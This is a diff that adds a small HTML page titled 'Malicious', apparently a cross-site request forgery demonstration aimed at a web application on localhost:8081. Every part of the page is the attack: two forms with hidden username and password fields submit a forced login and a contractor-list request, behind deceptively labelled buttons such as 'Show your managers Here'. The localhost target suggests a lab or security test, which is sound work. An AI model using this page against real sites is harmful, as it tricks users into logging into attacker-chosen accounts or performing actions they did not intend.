@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious</title>
+</head>
+    <body>
+        <div class="container">
+            <h1>Cross Site Login Request</h1>
+
+            <div>
+                <form action="http://localhost:8081/contractorList/5" method="get" name="CSRFreq">
+                    <input type="hidden" name="username" value="prankD" />
+                    <input type="hidden" name="password" value="12345" />
+                    <button type="submit"> Show your managers Here </button>
+                </form>
+            </div>
+
+            <div>
+                <form action="http://localhost:8081/login" method="post" name="CSRFLogin">
+                    <input type="hidden" name="username" value="prankD" />
+                    <input type="hidden" name="password" value="12345" />
+                    <button type="submit"> Submit Here </button>
+                </form>
+            </div>
+
+        </div>
+
+    </body>
+</html>
